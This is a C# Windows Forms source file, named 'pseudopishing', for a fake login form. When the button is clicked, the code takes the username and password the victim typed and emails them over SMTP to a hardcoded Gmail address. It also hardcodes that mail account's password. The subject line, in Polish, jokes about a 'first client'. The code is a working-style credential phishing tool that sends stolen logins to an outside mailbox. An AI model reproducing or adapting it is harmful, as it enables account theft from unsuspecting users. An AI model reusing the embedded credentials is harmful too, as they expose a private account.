using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace pseudopishing
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string login = txtLogin.Text;
            string password = txtPassword.Text;
            MailMessage mail = new MailMessage("dominikklim2001@gmail.com", "dominikklim2001@gmail.com");
            SmtpClient client = new SmtpClient("smtp.gmail.pl", 587); 

            client.Credentials = new NetworkCredential("dominikklim2001@gmail.com", "Foka123321");
            client.EnableSsl = true; // szyfrowanko
            mail.Subject = "Czesc oto twoj pierwszy klient hehe";
            mail.Body = "Login: " + login + "\n" + "Password" + password;
            try
            {
                client.Send(mail);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }
    }
}
